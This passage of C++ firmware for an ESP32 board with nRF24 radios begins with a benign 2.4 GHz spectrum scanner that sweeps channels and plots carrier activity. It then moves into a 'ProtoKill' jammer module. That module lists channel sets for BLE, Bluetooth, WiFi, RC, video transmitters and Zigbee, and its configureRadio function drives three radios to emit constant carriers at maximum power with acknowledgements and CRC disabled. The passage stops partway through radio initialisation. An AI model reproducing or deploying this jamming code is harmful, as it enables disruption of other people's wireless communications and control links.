static constexpr int kScannerStatusLineCount = 6;
static constexpr int kScannerStatusTextY = kScannerStatusY + kScannerBoxHeaderH;
static constexpr int kScannerStatusBoxH = 91;
static constexpr int kScannerLogGap = 4;
static constexpr int kScannerLogBoxH = 49;
static constexpr int kScannerLogBoxTop = kScannerStatusY + kScannerStatusBoxH + kScannerLogGap;
static constexpr int kScannerLogStartY = kScannerLogBoxTop + kScannerBoxHeaderH;
static constexpr int kScannerLogEndY = kScannerLogBoxTop + kScannerLogBoxH - 2;

#define SCREEN_HEIGHT 180
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

bool isSelectButtonPressed() {
  return isButtonPressed(BTN_SELECT);
}

byte getRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

bool carrierDetected() {
  return getRegister(_NRF24_RPD) & 0x01;
}

void setRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

void setChannel(uint8_t channel) {
  setRegister(_NRF24_RF_CH, channel);
}

void powerUp() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x02);
  delayMicroseconds(130);
}

void powerDown() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) & ~0x02);
}

void enable() {
  digitalWrite(CE, HIGH);
}

void disable() {
  digitalWrite(CE, LOW);
}

void setRX() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x01);
  enable();
  delayMicroseconds(100);
}

void scroll() {
  for (int i = 3; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  const bool scrolled = (Index >= MAX_LINES - 1);
  if (scrolled) {
    scroll();
    Index = MAX_LINES - 1;
  }

  const int firstNewIndex = Index;
  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < MAX_LINES) {
    Buffer[Index] = "";
    Buffercolor[Index] = WHITE;
    Index++;
  }

  static auto redrawLogLine = [](int bufIndex) {
    if (bufIndex < 3) {
      return;
    }
    const int yPos = kScannerLogStartY + (bufIndex - 3) * LINE_HEIGHT;
    if (yPos + LINE_HEIGHT > kScannerLogEndY) {
      return;
    }
    tft.fillRect(8, yPos, tft.width() - 16, LINE_HEIGHT, TFT_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(Buffercolor[bufIndex], TFT_BLACK);
    tft.setCursor(8, yPos);
    tft.print(Buffer[bufIndex]);
  };

  if (scrolled) {
    for (int i = 3; i < Index; i++) {
      redrawLogLine(i);
    }
    return;
  }

  for (int i = firstNewIndex; i < Index; i++) {
    redrawLogLine(i);
  }
}

static unsigned long s_scannerLastBtnMs = 0;
static constexpr unsigned long kScannerNavDebounceMs = 80;

void calibrateBackgroundNoise();
void scan();
static String scannerChannelGHzText(int ch);
static String scannerBandHint(int ch);

static void scannerWaitNavRelease(int pin) {
  const uint32_t t0 = millis();
  while (isTouchNavButtonPressed(pin) && millis() - t0 < 400) {
    delay(5);
  }
  delay(30);
}

void scannerHandleNavButtons() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  const uint32_t now = millis();
  if (now - s_scannerLastBtnMs < kScannerNavDebounceMs) {
    return;
  }

  if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
    calibrateBackgroundNoise();
    s_scannerLastBtnMs = millis();
    scannerWaitNavRelease(BTN_LEFT);
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_DOWN)) {
    scan();
    s_scannerLastBtnMs = millis();
    scannerWaitNavRelease(BTN_DOWN);
  }
}

static void scannerPollNavButtons() {
  maintainTouchNavBar();
  if (feature_active && (feature_exit_requested || featureExitButtonPressed())) {
    feature_exit_requested = true;
    scanning = false;
    return;
  }
  scannerHandleNavButtons();
}

void calibrateBackgroundNoise() {

  Print("[!] Calibrating noise floor...", UI_TEXT, false);

  for (int i = 0; i < 2; i++) {
    disable();
    for (int j = 0; j < 50; j++) {
      for (int i = 0; i < CHANNELS; i++) {
        if ((i % BUTTON_POLL_STRIDE) == 0) {
          scannerPollNavButtons();
        }

        setRegister(_NRF24_RF_CH, (uint8_t)i);
        enable();
        delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
        disable();
        if (carrierDetected()) channel[i]++;
      }
    }
    for (int j = 0; j < CHANNELS; j++) {
      backgroundNoise[j] += channel[j];

    }
  }

  int maxNoiseCh = 0;
  int maxNoise = 0;
  for (int i = 0; i < CHANNELS; i++) {
    backgroundNoise[i] /= 5;
    if (backgroundNoise[i] > maxNoise) {
      maxNoise = backgroundNoise[i];
      maxNoiseCh = i;
    }
  }

  Print("[+] Calibrate done  Ch" + String(maxNoiseCh) + " " + scannerChannelGHzText(maxNoiseCh) + "GHz", UI_WARN, false);
}

void scan() {
  Print("[!] Scan refresh...", UI_TEXT, false);
  memset(channel, 0, sizeof(channel));
  disable();
  for (int j = 0; j < 50; j++) {
    for (int i = 0; i < CHANNELS; i++) {
      if ((i % BUTTON_POLL_STRIDE) == 0) {
        scannerPollNavButtons();
      }

      setRegister(_NRF24_RF_CH, (uint8_t)i);
      enable();
      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
      disable();
      if (carrierDetected()) channel[i]++;
    }
  }

  int peakCh = 0;
  int peakHits = 0;
  int active = 0;
  for (int i = 0; i < CHANNELS; i++) {
    if (channel[i] > 0) {
      active++;
    }
    if (channel[i] > peakHits) {
      peakHits = channel[i];
      peakCh = i;
    }
  }
  if (peakHits > 0) {
    Print("[+] Scan done  " + String(active) + " hit(s)  peak Ch" + String(peakCh), UI_WARN, false);
  } else {
    Print("[*] Scan done  no carriers", UI_DIM_TEXT, false);
  }
}

void runUI() {
#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {170, 210, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_undo,
    bitmap_icon_start,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {

    tft.fillRect(0, 20, 160, 16, DARK_GRAY);
    tft.setTextColor(UI_TEXT, DARK_GRAY);
    tft.setCursor(35, 24);
    tft.print("2.4GHz Scanner");

    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.fillRect(160, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, UI_ICON);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, UI_ICON);
      animationState = 2;

      switch (activeIcon) {
        case 0: calibrateBackgroundNoise(); break;
        case 1: scan(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 2) {
                feature_exit_requested = true;

                scanning = false;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void scanChannels() {
  disable();
  static uint32_t lastUI = 0;
  for (int j = 0; j < (int)SCAN_SWEEPS && scanning; j++) {
    for (int i = 0; i < CHANNELS && scanning; i++) {

      if ((i % BUTTON_POLL_STRIDE) == 0 && isSelectButtonPressed()) {
        scanning = false;
        Print("Scan interrupted by user", UI_WARN, true);
        return;
      }
      if (feature_exit_requested || featureExitButtonPressed()) {
        scanning = false;
        return;
      }

      setRegister(_NRF24_RF_CH, (uint8_t)i);
      enable();
      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
      disable();
      if (carrierDetected()) channel[i]++;

      uint32_t now = millis();
      if (now - lastUI >= UI_THROTTLE_MS) {
        runUI();
        scannerPollNavButtons();
        lastUI = now;
        delay(0);
        if (feature_exit_requested || featureExitButtonPressed()) {
          scanning = false;
          return;
        }
      } else if ((i % BUTTON_POLL_STRIDE) == 0) {
        scannerPollNavButtons();
      }
    }
  }
}

void outputChannels() {
  int norm = 0;
  for (int i = 0; i < CHANNELS && scanning; i++) {
    if (channel[i] > norm) norm = channel[i];
  }
  static uint32_t lastUI = 0;
  for (int i = 0; i < CHANNELS && scanning; i++) {
    if ((i % BUTTON_POLL_STRIDE) == 0 && isSelectButtonPressed()) {
      scanning = false;
      Print("Output interrupted by user", UI_WARN, true);
      return;
    }
    int strength = (norm != 0) ? (channel[i] * 10) / norm : 0;
    (void)strength;
    channel[i] = 0;
    uint32_t now = millis();
    if (now - lastUI >= UI_THROTTLE_MS) {
      runUI();
      scannerPollNavButtons();
      lastUI = now;
      delay(0);
    } else if ((i % BUTTON_POLL_STRIDE) == 0) {
      scannerPollNavButtons();
    }
  }
}

struct ScannerPlotLayout {
  int graphTop = 0;
  int axisX = 10;
  int plotRight = 0;
  int plotTop = 0;
  int plotBottom = 0;
  int plotHeight = 0;
  int plotWidth = 0;
  int maxBarHeight = 0;
  bool valid = false;
};

static ScannerPlotLayout s_plot;
static uint8_t s_smoothValues[N];
static uint8_t s_prevBarPx[N];
static bool s_graphChromeDrawn = false;
static int s_lastPeakCh = -1;
static uint8_t s_lastPeakVal = 0;
static int s_peakMarkerX = -1;
static int s_statusPeakCh = -1;
static uint8_t s_statusPeakVal = 0;
static int s_statusActive = -1;
static int s_statusPctBucket = -1;
static uint32_t s_lastStatusDrawMs = 0;
static String s_statusLineText[kScannerStatusLineCount];
static uint16_t s_statusLineColor[kScannerStatusLineCount];
static bool s_statusStaticDrawn = false;


static int scannerBarCol0X() {
  const int barsSpan = (kScannerBarsPerCol * 2) + kScannerBarColGap;
  return s_plot.axisX + max(0, (s_plot.plotWidth - barsSpan) / 2);
}

static int scannerBarX(int ch) {
  const int col0 = scannerBarCol0X();
  if (ch < kScannerBarsPerCol) {
    return col0 + ch;
  }
  return col0 + kScannerBarsPerCol + kScannerBarColGap + (ch - kScannerBarsPerCol);
}

static constexpr int kScannerGridDivisions = 4;
static constexpr int kScannerMinBarPx = 5;

static int scannerHorizGridY(int lineIndex) {
  return s_plot.plotTop + ((s_plot.plotHeight * lineIndex) + (kScannerGridDivisions / 2)) / kScannerGridDivisions;
}

static void scannerDrawHorizGridLines() {
  for (int g = 1; g < kScannerGridDivisions; g++) {
    const int gy = scannerHorizGridY(g);
    tft.drawFastHLine(s_plot.axisX + 1, gy, s_plot.plotWidth - 2, 0x2945);
  }
}

static void scannerDrawVertGridLines() {
  for (int v = 1; v < kScannerGridDivisions; v++) {
    const int vx = s_plot.axisX + ((s_plot.plotWidth * v) + (kScannerGridDivisions / 2)) / kScannerGridDivisions;
    tft.drawFastVLine(vx, s_plot.plotTop + 1, s_plot.plotHeight - 2, 0x2945);
  }
}

static void scannerResetGraphState() {
  s_graphChromeDrawn = false;
  s_plot.valid = false;
  memset(s_smoothValues, 0, sizeof(s_smoothValues));
  memset(s_prevBarPx, 0, sizeof(s_prevBarPx));
  memset(values, 0, sizeof(values));
  s_lastPeakCh = -1;
  s_lastPeakVal = 0;
  s_peakMarkerX = -1;
  s_statusPeakCh = -1;
  s_statusPeakVal = 0;
  s_statusActive = -1;
  s_statusPctBucket = -1;
  s_lastStatusDrawMs = 0;
  s_statusStaticDrawn = false;
  for (int i = 0; i < kScannerStatusLineCount; i++) {
    s_statusLineText[i] = "";
    s_statusLineColor[i] = 0;
  }
}

static void scannerRestoreColumnDecor(int x) {
  if (!s_plot.valid) {
    return;
  }
  for (int g = 1; g < kScannerGridDivisions; g++) {
    const int gy = scannerHorizGridY(g);
    if (gy > s_plot.plotTop && gy < s_plot.plotBottom) {
      tft.drawPixel(x, gy, 0x2945);
    }
  }
  for (int v = 1; v < kScannerGridDivisions; v++) {
    const int vx = s_plot.axisX + ((s_plot.plotWidth * v) + (kScannerGridDivisions / 2)) / kScannerGridDivisions;
    if (vx == x) {
      tft.drawFastVLine(vx, s_plot.plotTop + 1, s_plot.plotHeight - 2, 0x2945);
      break;
    }
  }
}

static void scannerEnsurePlotLayout() {
  const int screenW = tft.width();
  s_plot.graphTop = kScannerGraphTop;
  s_plot.axisX = kScannerGraphMarginX;
  s_plot.plotRight = screenW - kScannerGraphMarginX;
  s_plot.plotTop = s_plot.graphTop + 12;
  s_plot.plotBottom = bleContentBottom() - 13;
  s_plot.plotHeight = s_plot.plotBottom - s_plot.plotTop;
  s_plot.plotWidth = s_plot.plotRight - s_plot.axisX;
  s_plot.maxBarHeight = s_plot.plotHeight;
  s_plot.valid = s_plot.plotWidth >= 32 && s_plot.plotHeight >= 10;
}

static void scannerDrawGraphChrome() {
  scannerEnsurePlotLayout();
  if (!s_plot.valid) {
    return;
  }

  const int screenW = tft.width();
  const int graphBottom = bleContentBottom() - 2;
  tft.fillRect(0, kScannerLogBottom, screenW, graphBottom - kScannerLogBottom + 2, TFT_BLACK);
  tft.fillRect(s_plot.axisX, s_plot.plotTop, s_plot.plotWidth, s_plot.plotHeight, 0x0842);

  scannerDrawHorizGridLines();
  scannerDrawVertGridLines();

  tft.drawRect(s_plot.axisX, s_plot.plotTop, s_plot.plotWidth, s_plot.plotHeight, UI_LINE);
  tft.drawLine(s_plot.axisX, s_plot.plotTop, s_plot.axisX, s_plot.plotBottom, WHITE);
  tft.drawLine(s_plot.axisX, s_plot.plotBottom, s_plot.plotRight, s_plot.plotBottom, WHITE);

  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.drawString("2.4 GHz Spectrum", (screenW - 96) / 2, s_plot.graphTop + 2);

  const int labelY = s_plot.plotBottom + 2;
  tft.drawString("2.40", s_plot.axisX + 2, labelY);
  tft.drawString("2.45", s_plot.axisX + s_plot.plotWidth / 3 - 8, labelY);
  tft.drawString("2.50", s_plot.axisX + (s_plot.plotWidth * 2) / 3 - 8, labelY);
  tft.drawString("2.52G", s_plot.plotRight - 30, labelY);

  s_graphChromeDrawn = true;
  memset(s_prevBarPx, 0, sizeof(s_prevBarPx));
  s_lastPeakCh = -1;
  s_lastPeakVal = 0;
  s_peakMarkerX = -1;
}

static void scannerFindPeak(const uint8_t* vals, int count, int& peakCh, uint8_t& peakVal) {
  peakCh = 0;
  peakVal = 0;
  for (int i = 0; i < count; i++) {
    if (vals[i] > peakVal) {
      peakVal = vals[i];
      peakCh = i;
    }
  }
}

static String scannerChannelGHzText(int ch) {
  const uint16_t mhz = (uint16_t)(2400 + ch);
  char buf[10];
  snprintf(buf, sizeof(buf), "%u.%03u", mhz / 1000, mhz % 1000);
  return String(buf);
}

static String scannerBandHint(int ch) {
  if (ch == 2 || ch == 26 || ch == 80) {
    return "BLE";
  }
  if (ch >= 10 && ch <= 15) {
    return "WiFi Ch1";
  }
  if (ch >= 34 && ch <= 40) {
    return "WiFi Ch6";
  }
  if (ch >= 59 && ch <= 65) {
    return "WiFi Ch11";
  }
  if (ch >= 76 && ch <= 86) {
    return "RC/Video";
  }
  return "ISM";
}

static String scannerChannelBandLine(int ch) {
  return "Ch " + String(ch) + "  " + scannerBandHint(ch);
}

static String scannerFitStatusText(const String& text) {
  const int maxWidth = tft.width() - 16;
  tft.setTextSize(1);
  if (tft.textWidth(text) <= maxWidth) {
    return text;
  }
  String out = text;
  while (out.length() > 1 && tft.textWidth(out + "...") > maxWidth) {
    out.remove(out.length() - 1);
  }
  if (!out.isEmpty()) {
    out += "...";
  }
  return out;
}

static int scannerCountActiveChannels(const uint8_t* vals, int count) {
  int active = 0;
  for (int i = 0; i < count; i++) {
    if (vals[i] >= 3) {
      active++;
    }
  }
  return active;
}

static void scannerDrawStatusLine(int line, const String& text, uint16_t color) {
  const int y = kScannerStatusTextY + line * LINE_HEIGHT;
  const String fitted = scannerFitStatusText(text);
  tft.fillRect(8, y, tft.width() - 16, LINE_HEIGHT, TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(8, y);
  tft.print(fitted);
}

static void scannerDrawStatusLineIfChanged(int line, const String& text, uint16_t color) {
  if (line < 0 || line >= kScannerStatusLineCount) {
    return;
  }
  if (s_statusLineText[line] == text && s_statusLineColor[line] == color) {
    return;
  }
  s_statusLineText[line] = text;
  s_statusLineColor[line] = color;
  scannerDrawStatusLine(line, text, color);
}

static void scannerDrawTextBoxes() {
  tft.fillRect(0, kScannerStatusY - 2, tft.width(), kScannerLogBottom - kScannerStatusY + 2, TFT_BLACK);
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  tft.drawRoundRect(4, kScannerStatusY, tft.width() - 8, kScannerStatusBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kScannerLogBoxTop, tft.width() - 8, kScannerLogBoxH, 3, UI_LINE);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.drawString("RF Status", 8, kScannerStatusY + 3);
  tft.drawString("Activity", 8, kScannerLogBoxTop + 3);
}

static void scannerDrawStaticStatusLines() {
  if (s_statusStaticDrawn) {
    return;
  }
  scannerDrawStatusLineIfChanged(4, "Range: 2.4-2.528 GHz  128 ch", UI_DIM_TEXT);
  scannerDrawStatusLineIfChanged(5, "State: Monitoring", UI_DIM_TEXT);
  s_statusStaticDrawn = true;
}

static void scannerUpdateStatusPanel(const uint8_t* vals, int count) {
  int peakCh = 0;
  uint8_t peakVal = 0;
  scannerFindPeak(vals, count, peakCh, peakVal);
  const int active = scannerCountActiveChannels(vals, count);

  const int pct = peakVal > 0 ? min(100, ((int)peakVal * 100) / 64) : 0;
  const int pctBucket = pct / 3;
  const uint32_t now = millis();
  if (peakCh == s_statusPeakCh && pctBucket == s_statusPctBucket &&
      active == s_statusActive && now - s_lastStatusDrawMs < 200) {
    return;
  }
  s_statusPeakCh = peakCh;
  s_statusPeakVal = peakVal;
  s_statusActive = active;
  s_statusPctBucket = pctBucket;
  s_lastStatusDrawMs = now;

  scannerDrawStaticStatusLines();

  if (peakVal == 0) {
    scannerDrawStatusLineIfChanged(0, "Peak: none", UI_DIM_TEXT);
    scannerDrawStatusLineIfChanged(1, "Ch --  --", UI_DIM_TEXT);
    scannerDrawStatusLineIfChanged(2, "Strength: 0%", UI_DIM_TEXT);
  } else {
    scannerDrawStatusLineIfChanged(0, "Peak: " + scannerChannelGHzText(peakCh) + " GHz", UI_TEXT);
    scannerDrawStatusLineIfChanged(1, scannerChannelBandLine(peakCh), UI_TEXT);
    scannerDrawStatusLineIfChanged(2, "Strength: " + String(pct) + "%", UI_TEXT);
  }

  scannerDrawStatusLineIfChanged(3, "Active: " + String(active) + " channel(s)", active > 0 ? UI_OK : UI_DIM_TEXT);
}

static void scannerClearPeakMarker() {
  if (!s_plot.valid || s_peakMarkerX < 0) {
    return;
  }
  tft.drawPixel(s_peakMarkerX, s_plot.plotTop + 1, 0x0842);
  s_peakMarkerX = -1;
}

static void scannerUpdatePeakMarker(const uint8_t* vals, int count) {
  if (!s_plot.valid) {
    return;
  }

  int peakCh = 0;
  uint8_t peakVal = 0;
  scannerFindPeak(vals, count, peakCh, peakVal);

  if (peakCh == s_lastPeakCh && peakVal == s_lastPeakVal) {
    return;
  }
  s_lastPeakCh = peakCh;
  s_lastPeakVal = peakVal;

  scannerClearPeakMarker();
  if (peakVal == 0) {
    return;
  }

  const int markerX = scannerBarX(peakCh);
  tft.drawPixel(markerX, s_plot.plotTop + 1, WHITE);
  s_peakMarkerX = markerX;
}

static void scannerUpdateBarColumn(int ch, int newPx, int oldPx) {
  if (!s_plot.valid) {
    return;
  }
  const int x = scannerBarX(ch);
  const uint16_t bg = 0x0842;

  if (newPx < oldPx) {
    tft.fillRect(x, s_plot.plotBottom - oldPx, 1, oldPx - newPx, bg);
    scannerRestoreColumnDecor(x);
  }
  if (newPx > oldPx) {
    tft.fillRect(x, s_plot.plotBottom - newPx, 1, newPx - oldPx, UI_WARN);
  }
  s_prevBarPx[ch] = (uint8_t)newPx;
}

static void scannerSmoothFrame(const uint8_t* frameHits, int count) {
  for (int i = 0; i < count; i++) {
    if (frameHits[i] > 0) {
      int blended = (((int)s_smoothValues[i] * 3) + ((int)frameHits[i] * 5)) / 8;
      if (blended < (int)frameHits[i]) {
        blended = frameHits[i];
      }
      s_smoothValues[i] = (uint8_t)min(255, blended);
    } else if (s_smoothValues[i] > 2) {
      s_smoothValues[i] = (uint8_t)(((int)s_smoothValues[i] * 7) / 8);
    } else if (s_smoothValues[i] > 0) {
      s_smoothValues[i]--;
    }
  }
}

static int scannerValueToBarPx(uint8_t val, uint8_t peakVal) {
  if (val == 0 || !s_plot.valid || s_plot.maxBarHeight <= 0) {
    return 0;
  }

  const int maxH = s_plot.maxBarHeight;
  if (peakVal == 0 || val >= peakVal) {
    return min(maxH, max(kScannerMinBarPx, (int)val));
  }

  const int span = maxH - kScannerMinBarPx;
  int scaled = kScannerMinBarPx + (span * (int)val) / (int)peakVal;
  return min(maxH, max(kScannerMinBarPx, scaled));
}

static void scannerUpdateBars(const uint8_t* vals, int count) {
  if (!s_graphChromeDrawn) {
    scannerDrawGraphChrome();
  }
  if (!s_plot.valid) {
    return;
  }

  int peakCh = 0;
  uint8_t peakVal = 0;
  scannerFindPeak(vals, count, peakCh, peakVal);

  for (int i = 0; i < count; i++) {
    const int newPx = scannerValueToBarPx(vals[i], peakVal);
    const int oldPx = s_prevBarPx[i];
    if (newPx != oldPx) {
      scannerUpdateBarColumn(i, newPx, oldPx);
    }
  }
}

void display() {
  if (!scanning) {
    return;
  }

  uint8_t frameHits[N];
  memset(frameHits, 0, sizeof(frameHits));

  disable();
  static uint32_t lastNavPoll = 0;
  for (int pass = 0; pass < (int)DISPLAY_SWEEPS && scanning; ++pass) {
    for (int i = 0; i < N && scanning; ++i) {
      if ((i % BUTTON_POLL_STRIDE) == 0 && isSelectButtonPressed()) {
        scanning = false;
        Print("Display interrupted by user", UI_WARN, true);
        return;
      }
      if (feature_exit_requested || featureExitButtonPressed()) {
        return;
      }

      setRegister(_NRF24_RF_CH, (uint8_t)i);
      enable();
      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
      disable();
      if (carrierDetected()) {
        frameHits[i]++;
      }

      const uint32_t now = millis();
      if (now - lastNavPoll >= UI_THROTTLE_MS) {
        scannerPollNavButtons();
        lastNavPoll = now;
      } else if ((i % BUTTON_POLL_STRIDE) == 0) {
        scannerPollNavButtons();
      }
    }
  }

  scannerSmoothFrame(frameHits, N);
  scannerUpdateBars(s_smoothValues, N);
  scannerUpdatePeakMarker(s_smoothValues, N);
  scannerUpdateStatusPanel(s_smoothValues, N);
}

void scannerSetup() {
  setTouchButtonInputEnabled(true);
  bleSetScannerNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  uiDrawn = false;
  scannerResetGraphState();
  scannerDrawGraphChrome();

  setupTouchscreen();

  scannerDrawTextBoxes();
  scannerDrawStatusLineIfChanged(0, "Peak: scanning...", UI_DIM_TEXT);
  scannerDrawStatusLineIfChanged(1, "Ch --  --", UI_DIM_TEXT);
  scannerDrawStatusLineIfChanged(2, "Strength: --", UI_DIM_TEXT);
  scannerDrawStatusLineIfChanged(3, "Active: 0 channel(s)", UI_DIM_TEXT);
  scannerDrawStaticStatusLines();
  Print("[+] Scanner ready", UI_WARN, false);
  redrawTouchButtonBar();

  SPI.begin(13, 11, 12, 4);
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(10000000);
  SPI.setBitOrder(MSBFIRST);

  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);

  disable();
  powerUp();

  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x03);
  delayMicroseconds(130);
  setRegister(_NRF24_EN_AA, 0x0);
  setRegister(_NRF24_RF_SETUP, 0x0F);

  scanning = true;
}

void scannerLoop() {
  scanning = true;
  while (scanning) {

    if (feature_active && (feature_exit_requested || featureExitButtonPressed())) {
      feature_exit_requested = true;
      scanning = false;
      break;
    }

    scannerPollNavButtons();
    runUI();
    scanChannels();
    outputChannels();
    display();
    delay(2);
  }
}

}  // namespace Scanner

namespace ProtoKill {

RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
RF24 radio3(CE_PIN_3, CSN_PIN_3, 16000000);

enum OperationMode { BLE_MODULE, Bluetooth_MODULE, WiFi_MODULE, VIDEO_TX_MODULE, RC_MODULE, USB_WIRELESS_MODULE, ZIGBEE_MODULE, NRF24_MODULE };
OperationMode currentMode = WiFi_MODULE;

bool jammerActive = false;

const byte bluetooth_channels[] =        {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
const byte ble_channels[] =              {2, 26, 80};
const byte WiFi_channels[] =             {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12};
const byte usbWireless_channels[] =      {40, 50, 60};
const byte videoTransmitter_channels[] = {70, 75, 80};
const byte rc_channels[] =               {1, 3, 5, 7};
const byte zigbee_channels[] =           {11, 15, 20, 25};
const byte nrf24_channels[] =            {76, 78, 79};

const byte BLE_channels[] = {2, 26, 80};
byte channelGroup1[] = {2, 5, 8, 11};
byte channelGroup2[] = {26, 29, 32, 35};
byte channelGroup3[] = {80, 83, 86, 89};

#define SCREEN_HEIGHT 320
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

volatile bool modeChangeRequested = false;
volatile bool modeChangeRequested1 = false;
volatile bool jammerToggleRequested = false;

static constexpr int kProkillLogTop = 48;

static int prokillVisibleLines() {
  return bleMaxLinesInZone(kProkillLogTop, LINE_HEIGHT);
}

static bool prokillLineFits(int yPos) {
  return yPos + LINE_HEIGHT <= bleContentBottom();
}

static void prokillRedrawLogLine(int bufIndex) {
  const int visibleLines = prokillVisibleLines();
  if (bufIndex < 0 || bufIndex >= visibleLines) {
    return;
  }
  const int yPos = (bufIndex * LINE_HEIGHT) + kProkillLogTop;
  if (!prokillLineFits(yPos)) {
    return;
  }

  tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
  tft.setTextColor(Buffercolor[bufIndex], TFT_BLACK);
  tft.setCursor(5, yPos);
  tft.print(Buffer[bufIndex]);
}

static void prokillRedrawAllLog() {
  const int visibleLines = prokillVisibleLines();
  for (int i = 0; i < Index && i < visibleLines; i++) {
    prokillRedrawLogLine(i);
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  const int visibleLines = prokillVisibleLines();
  const bool scrolled = (Index >= visibleLines);
  if (scrolled) {
    for (int i = 0; i < visibleLines - 1; i++) {
      Buffer[i] = Buffer[i + 1];
      Buffercolor[i] = Buffercolor[i + 1];
    }
    Index = visibleLines - 1;
  }

  const int firstNewIndex = Index;
  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < visibleLines) {
    Buffer[Index] = "";
    Buffercolor[Index] = WHITE;
    Index++;
  }

  if (scrolled) {
    prokillRedrawAllLog();
    return;
  }

  for (int i = firstNewIndex; i < Index; i++) {
    prokillRedrawLogLine(i);
  }
}

void prokillHandleNavButtons() {
  if (!featureHasTouchNavBar()) {
    return;
  }

  if (isButtonPressedEdge(BTN_UP)) {
    jammerToggleRequested = true;
    bleWaitButtonRelease(BTN_UP);
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    modeChangeRequested = true;
    bleWaitButtonRelease(BTN_RIGHT);
  }
  if (isButtonPressedEdge(BTN_LEFT)) {
    modeChangeRequested1 = true;
    bleWaitButtonRelease(BTN_LEFT);
  }
}

void configureRadio(RF24 &radio, const byte* channels, size_t size) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.printPrettyDetails();

  for (size_t i = 0; i < size; i++) {
    radio.setChannel(channels[i]);
    radio.startConstCarrier(RF24_PA_MAX, channels[i]);
  }
}

void initializeRadiosMultiMode() {
  bool radio1Active = false;
  bool radio2Active = false;
  bool radio3Active = false;

  if (radio1.begin()) {
